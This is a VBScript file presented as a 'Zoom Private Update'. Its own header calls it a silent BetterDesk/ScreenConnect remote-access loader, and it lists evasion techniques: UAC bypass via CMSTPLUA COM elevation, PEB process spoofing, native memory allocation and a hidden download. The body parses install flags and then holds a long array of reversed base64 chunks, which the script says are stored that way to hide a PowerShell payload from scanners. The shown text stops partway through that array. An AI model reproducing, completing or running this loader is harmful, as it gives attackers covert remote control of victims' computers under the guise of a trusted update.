' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd, psFile, b64File, st

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.4.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "5V1L5MnQw5UMqlHR4YHV3kDdrJTd5QmcxQlengyZulmc0NFN", _
    "htSb5NEZRdGc3FWRDp1aEN3TLVmbr8EdV52KhZ2QKlXbyt0Y", _
    "UpFaTF0V3R0TqJUb4F0RTVVRh9SMWNDcuRlSBdGUwF0a4dzL", _
    "r4UNlBHem1kZqVVUGBla49CMvpmU09mZjN3K4R1Rsh3ZPBjT", _
    "5U1YSdmQQJVUDlnaotGTTt0VKdnehVDbF5GUtdVVk9Cb1U0Y", _
    "IFFcNRUYwJFViNHOI10datEURhkbJZTWuBVVJhnTSxGaoVFZ", _
    "jtEeSR1dQB1VvUzM4dEc4g3Vxl3NoNUcQpHdL10Y5VnM5hjM", _
    "FtkUoVWbMNkQCd2KvoHTIdEUrkUYm90T5MkbmlWdoNGMuNWd", _
    "6NTdppGMillZ5pnWyMXbQl2ZNh1TEtWMSdHaZdHUCtkMQBTV", _
    "0xkQrYHUCZHTnJjem9mNQNEONhGdIhUNMp0KwgkTldWVLNkU", _
    "pVVVthTWPJFaaJDNGJ1atdjVGNDWM92Vrt2amBnTyIFaYF2M", _
    "wgVRslUeZ5ESSh0dvkmcWZmNihHdat0To1mdjpFRUt2a1kXR", _
    "V9yaKhzay5WZ2UXVvsyM2lGZZJ0RJVUZwUkS4tSZRRUV0NzU", _
    "qlGW1sWO1xEUyB1Uq9COwRzQiJDMmR1ZYFGRl9mW6VVZzYEb", _
    "CtyLkR1cuRjZVZHdpVlUOVnaHBjNtNjdDdFN1R0daFjTpV1Y", _
    "jZURRFkdatUUspVOqFzUzIETjdDWYVXUmJmQaVkQHlFUhVEO", _
    "3MGNKhVOvsSNjdXZz8Ce3Q2L5M2dldDcvoHM302SBhEV6J2U", _
    "x8kM5hGWlRTO6JjZY5kZ5cHZ2Vneq9UO280NZ9GVxc2Q1pXd", _
    "nVEauZUV4YURxkGOppXMZN3KRx0NmdzNlNjaQhDNENjWzkTM", _
    "ORjV3sCex42YoJ1M5gVUVZ2ar9SdQdzSaJVVHdVdyYFRwIUM", _
    "mZ2NWNDWy8SMCR2Y5dVNoVEeBlHSHJ0a0EDNyEXNqp2NwlEe", _
    "llWdyQ1L3Y3M1JWZEZTO0AXdvYXYWNTOX9iQip1NYZ1LsRkM", _
    "SNXdPF0SWdjb0kFcIRkavgHO0kFRTtWMWNVaEZ0L0YGZnJkd", _
    "EVkU3UzKFl0NJlzUGFkYn5Wc3E0LHRTOGRXV5FVW4hna1NTe", _
    "mV0ZKN1a6REcxYXQnVlSklTVnd0Z1JzK3IGe1F0QLxkc2NlY", _
    "wsUYzRDODh1YNFnQ5cFdGRzSJRjW69GWUZENThXQIdUZ280Q", _
    "SVGbnBVUZFEdvpEOpRzNQlkVws2LKVFZro1SXB1biFHR5U0a", _
    "M5WSTNFRrcUWHV1UTx2LrRDREZ2KrRjaBRnSaB1L2MUZRd2R", _
    "mpkUwUXQqpnV2ZmRUl2dqhDZrl1Yk12Sx8yLvpXYrt2NYtEb", _
    "4t2apJGZYtCZklWdMlWUGJlbDNlSQpFNwM2R4cjQ0NXMvEFS", _
    "udGTnh1S5B1KuJlYNpVYK5UNjRDdEFlNsBFdRFUNUlTVYhUQ", _
    "FBnSSZlQDxkYzoWZ4xGWm9yTQhTUYtkYWZGOwVzSxI1Yi9GR", _
    "r8GS3IDZUVTOyYlSqBTOa1EUvc3T3gXRUBFeQ9ieyYmQaBzN", _
    "5M2a0N1SEh2T4FEWQVTQa9yRLVHZ3U2dtNVY0NlWrMHUCdTW", _
    "GRkZ3EzTIhTbNZWQYJDTwlETHpUcipVajZVRv4kW0c0cGdDZ", _
    "29CaHNmdxQ2byETO2YFNrAVWvYjeBhUavEWVY9mbHlkeGJ0Y", _
    "vBVN3MlQ4pkQR5UcPNTM6N0NmFnV2VGWqdjZ3JjbiR0T4QTM", _
    "HhHcuRHWEp0dmFGVFRkWrcEVzc0QmRzR2o0USdzMrFUVClEe", _
    "ipFdpJWM3kzazNzKxolZTRncY5mbUVEZrcXVldEU4YXUkt2K", _
    "VFXWV9CcVllNCpmV0RWUzQ1c1AVcCJEMoNHU3kjS1JHZKVnc", _
    "kRjZMlHTPdVWJJmbqN2bzlGW1J3ZvtEO4EnSSlkQShVRJlVU", _
    "nF2aSNXSIVGShFnZ6hEOUZnczljTzlmdzUlZzMjT20mexZne", _
    "DRGcRRlTptUaw8kQjRzMRFFajdzRBRTUUlja5B3TNNmcy8CV", _
    "idzRWFGN3klZPN0d20EaywWUHF1awsCculVS3QlUzgGVVFGT", _
    "QRTVk9mZotmZwYWZnFnRzVkQKV2ZVpEcrxWYOh1Ksl0KNRUQ", _
    "4FkWzJDUXFDc1hFZPVmWQZ0SyhzbHFENollRwFWYRh2ahJEa", _
    "VJzQYt2QCRDaJl2LmB3TNV1d0c3UvYlZzomSQVVVNFGWpZjU", _
    "3JjSSNzLLZ1LnhkZotGMLhFd5NnWhRnTOdUOQVkQHBXcOp2L", _
    "lJlQStiS3oWRDV1KrVVVzZja1V1NRtSYZF2avdmMJVEW6VTb", _
    "rBVQyJTRT9SSOZEdsVTVmlUSJ9yL1k2YW9SYP10LFFUUjJEU", _
    "2Z3axgkVUVUMBxUTxJzTYFjQQJ0a2UmajJWN4Z1U3REOEhXW", _
    "4VEco90UwYkS1UGevolNylFZMZFZFlFbzBHN3FFMkVWbUpVZ", _
    "xR1RUl3ZyIGOLtieaBDMiVUYxVXSCBlRtJUO1gVaI5UMBFlS", _
    "Pl0TwRkM54WN4ZDdnxWZXR3ZTtmdiRUMHpWR3Z1LrhWcQhXb", _
    "SdnZDBDa5hHUZx0bLpUYKpnQpBDaotGRMRkZI5kSq9WNBVUO", _
    "tZnRt5kREFHR65UbxFVTRdlWqlDcClDWHxEMqNmUwkWTUFVO", _
    "2BVNZ5UWxZDWC92bDtEahV2KGNEN6VjSR9UY0dmVXxUa3pnb", _
    "BtGVMdWOvRWbJlnNVh1Rx4WY5sCdDVldaBDOWhGRzEDUUJzb", _
    "jdGVPBjTuNWNxY2YTFjbUV1YCFUe2VmYllkdk90a3JjQ442U", _
    "xV0bl50bqJlNrMURWlVaDZkbWhDZL9Gc050cW5Eb2RUZ0VnZ", _
    "yQEW0I1SKRnRDtibTZEWTlEWC9mc2QmRhN2TJdWdKV1c5kzQ", _
    "BljMsdDWv5UaVFzNRFUbZBXTvUXTjRESBxWeMNnbC1EUKl2a", _
    "4h2QuNkeRxUT2JHUx0mbQJnRohUZJN2S14Ga3EDVBtWe2FHc", _
    "pJlMHlkStJGZllmN1skaHRFerYUcR9Gc3dEdNxGOihWNvJje", _
    "MlkbF9UTCV3TN5WMIRFUaVFVWRzQWxGUDBXSCpGNYZHS1UzR", _
    "phWaa9WTUFTQ1NkNNdjWMNzQGpVOKdXS4ZjeKdGSuVHTH9EN", _
    "3plSyN1U2tSQIZEMkdnTkN3UFlkQ0kGcrl3RnpFZrg0U5g3K", _
    "21EM312cZlUMrFnVlJEa5FlMsdjU3ZFMykXTBJ3NXR1QTtkW", _
    "jdWeBNHc28UQxx2S082MshDR1EHWrUUZMVDe3kVTGFmUyMWT", _
    "wFETCdjaCNFRKNleXFnT4VzKmpEVYhnUkJUcqJUOyNVUKZTa", _
    "RFzY2kmR1VHbTFjRywUST5keqRTVwgFcSJDVKVGUvd1avN1R", _
    "PREe3VkSu9GaulVVxlUZzwWR5lXVNtSSUtEUJNEVPVEaMBlW", _
    "0VGd4UmR0x2KD9iWUNGW1cUTnN0akJDO4lkTFlEaKhnbpxWe", _
    "yQEekR1b2RVOjFjcUhnah9UZWBzbrNkVXtkQ3NlU4hTZtZWc", _
    "ltUR400bUVHS4siYtNFTQ9GMyp1NTd2ZaZlMBRGc4oXY5J2c", _
    "yImZUFjSrIjSrI0U5Rnb0IWME5kMWNmW5k2bqJmRiVXYWVUc", _
    "Mxka4hmZ5RzasRnT6RGO0YUWHhFRvBjY1NUS3EFalxEarcnS", _
    "Oxkd6Z1bWJ0LGJWcOdDZFBTYzIkdMlVRKJXTDFXeFNTU1cDR", _
    "JdTOtN2ZmVGbShlRUV3cHxGdn1kU2IGWT9yczIkeYRHZL92L", _
    "v8USxMVaUJUdDZ3cyYWRvdWdXRnZWlWWndkajNEMDpHbpd0N", _
    "QlmTxtGUC5kYMNUNvMkbQ1EMGllNx52U0YUUhFnRBdUSH9kc", _
    "0dVa3JmWzlHasN3Qyc2dHVXY5Y3ZxpGOj5WR5Y1ckRkWJdUV", _
    "mdXWmt0TFtmakVUb4lnWORld0kkbDd1RURVVKFWTkFjMQFWb", _
    "lhUWJdFWBF0bRdXS1gVd0FHZqVWWKFzc5VUMkdXS2FUdzI3b", _
    "PJGduVnbiFjd3IUY5YjNPhzZkNjZ5IGZYljZWxGSQdTS5Y2d", _
    "KFUc20USoRDMvZVQxR3dihlT350d3l1NLREaXBjQ2gTSzQ2M", _
    "ERGZGFUSilVdTZ1dzl3SQh2bqF0Mh1Ue5EUOHpleZplcxlmY", _
    "yYjN2U1TYlFMIhVYzpWZ3kTYSB3MrITOmhUcwdDdvNnU5EWZ", _
    "VR3RXZFZGhGSnhkWohnbzAVTLNHWPRUb3kEeyMWYtlldFd3d", _
    "hZlVIhTRrkWSJx2aB9UbwFENGVHcltkcSd2SldVNtFzbxRWN", _
    "wh3KjJWYxtGMxJXbVpUSvR3Uvd1QudjVNdVVoJzKjZXSnFnd", _
    "3gXerYDNaRXWZpUWIFEe3RjYQt2Z6pURmZlRZl2cmtiQkFTc", _
    "3VWRFdEONRjewMEMGhWbUJWUwUmZDFjRURFWzMmNshlYrp3M", _
    "k5WbMZlROl0TwQzdDZzRJZEMmtUS2NkZPZXVHJ1SJlWbPFVZ", _
    "hV0ZTdFR4M1SrJmTLZXZPZTRHlUeLFUTSBDRi5GMlhWW6lGV", _
    "KlGaxtURXFnQzkEUQx2MyQDbwVzcrM2TPtUNOtybXdkbPZzT", _
    "6ZzZsR2UlhXM4AzQzhVYrFEOkNjdnlFO2xmcyUjUqBXaRpUS", _
    "5lVMsp1KKNUSRx2dvUnUvUUUMN1KzQ0SUZmbxdkcWlkVE5UY", _
    "mlUQWlTb6NGT3FEUVN2Uz42QxADaKtWWoNTNGJXSiNWQy0mZ", _
    "yZ0NTtyKztUVChkQKRHMuRkM4gHOrcUV5cTasVFcs1kaG1Ue", _
    "KpHSxkVTppnb0dEaklFOnl2aTBzS4F0cJhGV3JXZylFauhjM", _
    "L1ESzcWc3skd3IUNXNTTxYTR2pWanp0ZLNjcVhHd0oFSQFUN", _
    "yZERzNjahZEN2dkch90anNjUrlnNJllcHNTe4IVbxljR4oGM", _
    "3dVQlN1ciVlMKF1cBBFZDZzKLxUW4onVOxmct9Wao1mNo1mV", _
    "JF1QKNTSqV0UjxmR4gnNzQnS0o0KUJTSY5UVCV1ZxQGWy8mY", _
    "Mdnb2NUdl9EU6V3L5JlZN5Ecr9UZmh0Kr4ka1djdoJ3RrhXM", _
    "vQnZa12RQZHN542KLhUYYtWMClmZ09CZmJjWEpUeyRUVGNHN", _
    "4l3KS9WRYRjZzNjdxU3SCt2VRllQEJXMDp0VqRkS3hzKzsSY", _
    "vknSXB3by0kYlJleTVTYYpnWkh3NjJzUthDekVzSwAzS0ZEZ", _
    "01mYpF2ZjV1dltkSGx2ToV2SUNmUwAnTKJFZ3RkayNHOJJzM", _
    "hpEZ11mUtpGcWN2cNd1YwkVZIZTSaR3M2hnUroFbHFmQUNnZ", _
    "yRUQylFbR5maqNFaxFXMoNEMrsGajplUzsmUx92LzZFT2tWY", _
    "0IHbItEZr1WWhRnT2Z0NjlDTk5GVxcjS0p2MMdlbUJlY5cUZ", _
    "YlTcyQWWyxkWvFjWOl1aCdDWSlVYJVFW4MmWPd1d3MjWxh2V", _
    "TZmeNVVU1tUU4l1TiV2d2QnN092RVN1V1p3SBZkQ4IEVr42S", _
    "lVHT0FneyEWby9yLWtGMEB1SNpkbzUmY5Y2dxZVO0hGdrIFe", _
    "thkWaBDZtdTNu1EdutGauVmbhB1bxo2ZSBHNvtSaFVEW5w0Q", _
    "XlmMr10TIF1aZFTRTR1NuFHNh9mdyVWZVJmQ1wUVNdEOBRVW", _
    "6RTQnBDa1kGd0wEeJdDc5M2R1tmNiBnUwAXe4olUwwkbtVVZ", _
    "op0bC9EdvEVQLRjZTBTTipFMHJVWzdVdDp2cYlnaXxmbXFWY", _
    "XJWaJR0dS5WdIlWOyQTQKVFMwl3N5VkZPlXbzpGN3ETYyRlN", _
    "QV1KOVVS1A3Q59Wa11kRPJWeD12bkZjNBp0bz92SWlmW0dke", _
    "sZlaGl3NBJzcYJWYXd0VndHMnlHZnlkZvclUUZlW0kjc3BHb", _
    "nJmeWV1RudFMhN3ZnFDcYljNwomTSl0YyVHUVllVHRkQFhja", _
    "VF0ZGZEU2gHbXRkY1wEZxMkQHFkeSRDS6xkcvUUbIhjaSpXN", _
    "ZN3YxVDMwlUNGFDeiZnYwdUe3NldBpmb5E0N5hTSDNGdX9kT", _
    "5JXMrR0RDN2LJV1Qklndo1UbsZHc1YWO4tmR1o3VQhTQwVmU", _
    "zZDTR1WUZtUZ3wGS0l2RVlWalNmd5RUR5llW1s2Qj5kcUV3N", _
    "RBXZYVjMZtUbwwkazoWTJhHSMpkbVxkaaxEVslUUhlkZCBDM", _
    "QNFTOFESidXRrNmZyg1UxEEevhUYsBFdhZmcKxmNyRkMFxkZ", _
    "z40bwdjbI9UOiJWQHdmRKRXRDRVZMdXdNZESEF3YDV1b4kEa", _
    "S5UMPJHOBRnMpZ2UVNVZkxUeF9yTJRXVrgUaUpUZ6x0VjZza", _
    "10mVLtWWYhlbvZ2dVp2QBR0bTN3T3IGMotETmdVNHRTOaZVb", _
    "oVDd3pETVFDdolHTrt0VqR0dExEZx42SnxUdyZjZKZFM2lET", _
    "6Vld2smV5EUaMFGd4IEdExma5IlW0UGW1dTNONHSyRFVotyb", _
    "p9mT3ZGNxwUNVdTUXBTSxV1UDBHUiVjRhVUVXtkTBRmat5WT", _
    "LJkT6hXREh1dth1QzJjTGBneoljbU1GWDlGcFNDZZtmaUd1Y", _
    "SVUdppXYSZmWK5Gbwk3azxkQvdEUsR3KUFjVj1mNIZ0Stp2K", _
    "nRXeaJDTHBHVotSaTZ0KZ9GSvNmNlhnZudGSudlVFZFVXZUS", _
    "rNWYyoFRsp3a5gDWldmUFBzczVjW0pVdTFlT3QTOxJXbyoHe", _
    "zIHZVVDcsZ0UzljVBlkVHV1VxFVWvV3UWpmdaBDbDxkeE1Wd", _
    "2EDdr9UOkF1TiRXN4M0YWVUVOlWN1Yjc4dkZGZmYGN1LQFkR", _
    "OJ2bX90VxtUcKZnYzUWOMxEblBzKRhzMrETMXtyaopmY1c0Q", _
    "yA3NJZFcUVVONlWey92ZtJ2SlJXU5VVcJ5mcn9WT6RHa2UVb", _
    "ChHaZFVYGpETwB1dTNWb1VnUZdzNWlEbyBzL58GbERWN4kVQ", _
    "C1UQUlWcGF1LFZFRtlXZWdzbNt2cWRTQM9WZyQjRwZ3LmBTd", _
    "kBVMmd2L6hDVJBVZRFDTRN0UyBVT0NGc5ZTbhdkNnVnRrJHa", _
    "vJXc58ENopmNslDUZpGRhV1LvdVM1J1LxpXSwhkdRJ1L3MGe", _
    "KlFMSpUQF1WWit0V3k0b3o0dD1mMiFFS4tkZ0VnQ09Ge6BzM", _
    "Bh0RQpUaph1M582QMZESQlFe35WUwY1aIVTd1hjSyoGdyc1Y", _
    "Rh0Z4RzRGx0Z5d2RxJ2a2NTVZ9kZyAVTHF2dSt2dIlGVpV0V", _
    "4pGS5MnUzBXYnN2Khplb002Va9WRTFnaBNWQtFmVHdFVjNzM", _
    "ytCazhEOkZGVWhjbqNkdrpXb40UNSlmZkJ2V4wGNZdUc0gTZ", _
    "sFnay5UcRBHdzJUaXx0YZFUVSJ2NatkVxMjTvAjVFlkNIp2U", _
    "qZXRyBDNxVVNWN0alFURFlkSJFTdQRkeal1dhhkcFNEaZFWV", _
    "QJnVFh0RKB3ZRVne1N1SGhVVll3T0MHULV1M0pFdE52VSpUW", _
    "HVVO28yZ38SSxYWMrEmZl5UZ3cTdrwESxZGdmplb5AjNMdWN", _
    "3RWQ382SaZ1LwZjV490bhFGNkpHSxg1NklXd2UDMEJTdrEjd", _
    "FNzL5oENLRWZ5YEWjNnQ1lXWBVWcyMGTxomaCBTWS90TiNFR", _
    "CBVMBtSMwwkW1glM5EFdIdnVQZVVw40Tnl2ThBjS5NHSRJUV", _
    "3VVUp1EMNpEbvZ2NJlHTIVUVvg1YyQFW5ADVwETZQlDMORGO", _
    "DBjbYNjeNplePxUVGJ1QPlUOx0UMklEbZdUQ2R2TWBVSDpkM", _
    "FNWbWRzcxcGaGVWZxNlZs5UeLVXV3cHTWBnMvhGergjdNRna", _
    "RticKxUYqR3bYpVNwQHa44kZZ9kV6hVSxFzZj9EeBNGUp9Ca", _
    "qBDV3g3V2FDNvJTcBRHRzoWeplGU5olRNJzKtVndvI3YURGe", _
    "VBDUG9GVWV1NltiSR5mQ5NldtF1L5IzQjVWcW9UQR5GM4gWa", _
    "4gXQJFlTYhlMv80axUGcrgkbv0mQNt0QNFVQCJ2NFRWZId0c", _
    "JVVSOtSa3ZmZ3c1VydHc5Ike5Inblh3NCd0Z4wmZ1UEZuhFR", _
    "mtEd45Eer0mZxFja4omRiJka2gncv5WS2UTMzkkaHlncrITa", _
    "opERkZ1dyhFTKBHNxlHWa9iVyx2MvR0UHNndvEUV6B3Tvh3Y", _
    "ZZVQ1wmTjV1d3YlZmhlMGdERPVnbtxkR3YXNu9SMQVGNUVGW", _
    "5wWRVhFMjZFO4o0UylTSLN0T3I2QiNFWWdmYlhmTXdnZHpHM", _
    "NZGRVB1V2BHN2t2YTtURDljc4J3VuFTN5YjawclTnhjUmZUM", _
    "SV3Ktpndr0UQSlUTR9COEl2YJJ3U3IjVDNzKyR0N492bG92U", _
    "mZEMYVlRuZXVUhVcKNXN1YVMw9mSQZncnhETUVmZwYlUOZGb", _
    "jxWdxpnTSljbsZnUpNkU5ZDUn5Wa0IFT5F1b1gTUSdFWpFnT", _
    "mF1aqBDZYZ0SPtCMotyd0p0M0d3atV2b3UXNSp0Kip1UXhnQ", _
    "n9GRK1GNRRUQ6t2MmlGaHd2SnJnYCVHaZJ2Yy5mbzVXR1JHZ", _
    "qJjcTZXZNVFbvRUOoNmdI1ERHh3T5AXRQhlbF9yK1w0SQplY", _
    "i5mTrQlT3Mne5l0LTN1VFlVewgHU3JmaGJmbmpFUvQWNGh1c", _
    "zVFbr0Ue41kMkdzL5syThhDVJR0L3EVezdmbWBnZ3NTO6pXU", _
    "JFHOld3K0V0dUl3daVzdJhEaqx0VzkVZmJmbqBFe1xGaEl3c", _
    "58WSkNlaoNGez8yLZ1kTqtybJZ3KEVTW5IzM6RFTURmV2hUZ", _
    "EdnYu5Wd2AlYlpHSxwGdiBTOXpWZ1EDWm9idOFTbVVWTTtUT", _
    "5pXNJBldxQmT2YWcIVHRzYFTyhWZ11ENSFmNG12LyYTaEpEM", _
    "ZtiTid0YyxkM5g2VxA1a6NjR2tmVrcEdHFnMKZjVyVXS5Y2d", _
    "1QXe3FEe3MUan5GSHNXOKJTV0JzaHJWOadzcOZWdhlzLDJHd", _
    "4Fmd4VESWJjeOxEZrJ3dCN1MrU0NsN1V20WTzRlV5hkVph3K", _
    "xEEbQNXQ1NnaXh0Sm9WT0UXRWN3LygWcNl1STpGVrkFV1ZjT", _
    "KF0YrUVNBpEep1mRZZkSUpFalFHMiNjVlhnTvV2RvNnatVXc", _
    "KRkbw40QyhjW3hnYXRVRWZTaY1WNqR3ZvUHRsd3LzRXQUVXc", _
    "zUnNOticv1kQj1WW1BVTTNGZFVneZJnavcXMpBXZHdDbBBTO", _
    "uZTZ4YjV6dEeMFzMvVWOoFzNLdFaSVXV5MDdvYzNwNTMuZmN", _
    "xg1KZpleKdHejlkVVN0KzQDR2VlZIpXcq1mUNJETIVnZZRTb", _
    "nV2d3MjT4kjarAHWwBna4RGSllzKE9kN2g3b3FnUw0GehFEa", _
    "yJWVqNmRJlEUEplZ2V0dipVTPN2MF1UerhTOLB3L4EVOV5UY", _
    "zFnV5EUbvN2LIxGdxZFMlJlRlx2dvcXTxIDdHtEbV9UTxNHV", _
    "Fd3ckZWdCZnc3oXT39UYHtSVONVW04GVBpWRS9iN4clSyJWa", _
    "ml2dnRVSSRFZxNVNuVEcrMEdthUbwN1b5oEMyIkeVJ2T5ZXa", _
    "CZ0R0lUTUtSTB5kV1NEbOhEbWRUbwF2MVJFTrIkSsRHZFh3M", _
    "GVTWal2QoJWbXdFZmhmT4x2dSZTYmBTSNp1MihjZ0dWTtVWd", _
    "Th1cRF1YO9ybUJDdaBzYwZjcWZUUNpVW2RzK08kSvxWe5Z2Q", _
    "QBlVZd2bndmdKJmR4ZVTNdnMwNHUFVkN2QnZxkEUFh1ZUdXR", _
    "Tp0KZR1Th10MhplUVlDS3RWbVFDRMxkTYdlSwRXb1lVN4clU", _
    "whXQjFEbaRnQRpGdB50bDZHOhhTO5IlTixESChGVwR2SjBTV", _
    "xRmQIJ0VSNjSwglTrxEWH5keqllSrN0aqhVerV1VSd3b5JVM", _
    "2QnQZZVZZlXOElTbxVHcx5UcnFWMlVkNllkQZRmdBxkSJlnd", _
    "U52czpUOCZGRoFGRPRVTjR3Zy9CS3EERrUmdu9ydrckYaFVQ", _
    "BRXcShmYWl0an5WdltWaGlWe29CZsR0dHhnV5wGdTdWWaxUZ", _
    "xklUOdlT0pGS3E2Vop3MydWMEFXOzRWS3RXR5lWQ5ZnYJRGW", _
    "2MndmRkRLpVclNkTndVW5UlSXVleuNlUql0SFN0RmJXNIRUW", _
    "aRlSPVlYy50NohkMMJVQadlVVpUeC9kNMV1dZ5kdoVkVthWV", _
    "KdjNatmT3E3YDlnSTF0aQJVMCtmdlBjSRdlRwNnZ2RUZ0EmR", _
    "yFVMBVWRnBncJx2R3pnMQRkM3p0d2tycEFWOSBnYHNUc3w2Z", _
    "0lEW3IERkFlcPNUUUl1auZWbsl2S5d0SXNDTJhjRN9kaGlFc", _
    "NdFOS9iUktSUZJzUkd3MkZkVuV1Li9kQMR2UkR0NRJDZGFEc", _
    "2EWWF9WRaV1ZMxUO3wWZwpGZ2UXZzFHUZJ3KBR3U2EnYmpVQ", _
    "5gFUlhjaPJDbrUjevA1Zjh1QPh0VzMWNM9kYWRmQXJ1bvQzQ", _
    "ycHOktSbrIWd3UFeQRkMvQVc3ljUFFWdv9Wd2M0LVVFa4gTd", _
    "jVFaPZjMhdVYORTZGJzV2hGU39kTO5UVY9CWxZnNxlTeOtiY", _
    "JBTdCpERU9EdPlVaGtET1NUNTBlQCNFa2hVMxIDMpFDUipVW", _
    "FJ0TLF1cxQTewoVZ3pmY1dVOqJ2Z29EM1BlawhVMKJmNv1UV", _
    "E5Ua1oXc0UDT0V2SjhUbI5kRLRVU0kVdl1GWsJUTphlUEh2b", _
    "Bh0cOZ1NPF2d3k0b3EWUEZGZSx2SVdkbO1WU1cmT4B1VYVVW", _
    "LJWeQh0KBZDcyMmTxYnRSREcxNmZCBXSR9SQLFTUWx0Y3Uza", _
    "VNjSRdzbuV0R6t0bmdTQWhjMEF1bSZHcOdnQykmU2lDNnNjd", _
    "6RFe4FkWZ9yQxoWcJhXUX9yaxREMmBFRlllbOJzZUJUbzIFW", _
    "UV1NoJmVBVlck9mV2U0Rhd3Snh3R4FlTmVneIBFWQVjZlZTa", _
    "3JDdVNlZYdFW1p3dxsyREFDZihGUHhmQmZTMuVFb0p1Zhp1d", _
    "ZVlMxZ0YIRnexATSnpnZzQjMHZXUxNWWttESvVnRrVFbRVWT", _
    "wY2NhF3RKJTSmdnSn10Vq1kY6hVdwBzQMBncDZlaINzUNNXZ", _
    "3JTbWRncQhTMmpWbQVUcEBlRkJ2QI9CT0kWNQpmcuhTbtpEd", _
    "rc3R1dVT2tyKyATdGZXY2IlUQVkMDtCSsF3NrdVT0pFa3AVO", _
    "Rd0LqtkVWtWRrQFSTRkZOpnb1JnYDxEawZ2UnlzNON0YTplM", _
    "k92ctxEVy9CNrclTzQjbiJnMyF3SZlmSMpXS4NGVw02d6Zzb", _
    "rJGelBFOzoUWOVDeXRGZV1EVKFTd4UWTytmer5UcyZVQtd0K", _
    "18mbaNVWkFkRRd0V2pHaMVXTxJzZtlWRBF0Ltd0RJdnRn9Gd", _
    "EZ3Qxp0VrAja0d1T6NTVXJUcspmM3FERvUmbqFDZvBXNadlN", _
    "k9iZZhlNxkGRSh3RMRFSVhndEJmSXRlYS52amd2bvk1Y0RGV", _
    "vo1QkF3URRmQEBje2B3Rz1UaPVEMLFXc392VzMTbxVHSxpFc", _
    "rF3NIVlNqJWZGhEdFRXY3QXcvxmVW9UMjlTTY1kQopXQ05EU", _
    "v9GS2ZmcB9UShJGbqFlTNZlVkt0Kzh2ZzYzVxQTY2sme3E3c", _
    "2JzdrlzSyMnQkJ0dUVUNHdna4VHRSJTcvl3Uat0bjF0QJ12K", _
    "lNmRSt2Zy5kR4MTZ5VHaysWcVJkMxBlUIdUMahTR2dENnVkR", _
    "tZUOCdWcPxEeLdVWa5ENy8EcSZlVWFGNJRUbvJ3RjdleJlUR", _
    "x1WRxYDORhlWIVFURdkQB5EbxcGVVJGSwB3KwIkRjRmbshEd", _
    "vFWMJN1ar90MxQkNwkGdyFGewZkSjRmNwdja29ESatEZ69ke", _
    "yZUehR0KFBXTH9WQOZ3bsBzVvM1LZhEVn9UQyMkdzI3Zx0mR", _
    "0cVW6h1dwRTe4AlTkdjSWBzbxwERL5EbZJXeXhlVwIncwc0U", _
    "rp2VntEOPZER5l0Tvkna6dXQy1kWvQHVvUDbChFV55WSvZjR", _
    "RlDVjVEOrIGMKVVMTlWV3B3U5YzVMFmR4dTc2pFZwN1ZLNFW", _
    "qB1K4kDZYF2Z38CWlhXNuRmNy52NvgUO2QHVQN3TzcDZxhFd", _
    "UVXbhtCOYRTZPV0NKdTYsRVenN2NGNEcDl3L2R2MapXMvYmY", _
    "vI1Z19WV1g1VJdlVTdFawgkWBh1Mrx2TtllVBBndnN3NLNWd", _
    "voVVhR2VZ90LWZXTzcjQG5kdHRzT15WdmFGOodWeGx2N2hkZ", _
    "2dTODdFamJFWOlkashkdJVFOQpkRqtEWG5mbqxWdGtCRORmZ", _
    "0QHVltUOxVkcTJkSQJ2Z1NVND1UakhnY0ZWUUdzVulUW3oHd", _
    "rMzbhZmZxUmVtNlMrcEM0t0KodEOvNnMpZ0YU50bHdnM0tEV", _
    "oV0Yi9mNuBVULlzaaFUS2EGMPNTONdjYHBzcQ5UVzZGcmxka", _
    "2FnWENHRidkWkJjTzJ1LZVXO2J1YHJ2Z0hGNItkYxB1UykTc", _
    "0JFRJJVaNFVQOJFb1MkNEB3aTZmYqBHWot2LjdzYrlTc1s2V", _
    "r1GZldUZoBlRVRle1ckUaZEWMhlNvwGZ5MTOhZ0NKJDNClEV", _
    "DdEdONlTz92V2dnVyMFdr1kW4B3aDZmWRpXeIxmWsxEd2AnN", _
    "zl3LUdXbY1GM1Y0bu9WQBlEUXVkSwkUSPFjRQ10Q6d0Uq90Z", _
    "ttkYTBXYXVTWzRnSJVlNoJFd1YURNV3L09iYMtGTTFjdhNWd", _
    "ENnRnF0Qtd2Tr9ERK9kY1pHUyMGdZl3bZhUejJEayVjNN12S", _
    "vE3c4wmR0xmNENVeEpFc6NUZM50N39mNqR0bSNGO2FWavpVd", _
    "XFmeypXN00WU5QnWRtCTXFneyRHZntWc5plUUl3MxVneodUV", _
    "rRmSUp1YslkR3hEdMllNC9yT0UEc3JzcaVzVipVesNTbOBVO", _
